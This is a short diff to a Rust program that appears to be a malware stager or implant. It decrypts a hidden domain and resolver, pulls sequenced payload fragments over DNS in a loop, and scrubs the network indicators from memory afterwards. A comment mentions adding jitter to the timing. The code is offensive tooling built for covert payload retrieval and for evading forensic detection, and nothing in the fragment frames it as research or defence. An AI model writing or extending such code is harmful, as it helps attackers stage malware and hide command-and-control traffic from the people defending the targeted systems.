@@ -42,7 +42,17 @@ fn main() {
         std::str::from_utf8(&domain_clear).unwrap(),
         std::str::from_utf8(&resolver_clear).unwrap()
     );
-    let mut frags = vec![dns_source.fetch()];
+
+    let mut frags = Vec::new();
+    for seq in 0..255 {
+        if let Some(frag) = dns_source.fetch_seq(seq) {
+            frags.push(frag);
+        } else {
+            eprintln!("[+] Received EOF or timeout on sequence {}", seq);
+            break;
+        }
+        // Optional jitter sleep could go here
+    }
 
     // Scrub cleartext network indicators from memory immediately
     crate::syscalls::secure_zero(&mut domain_clear);
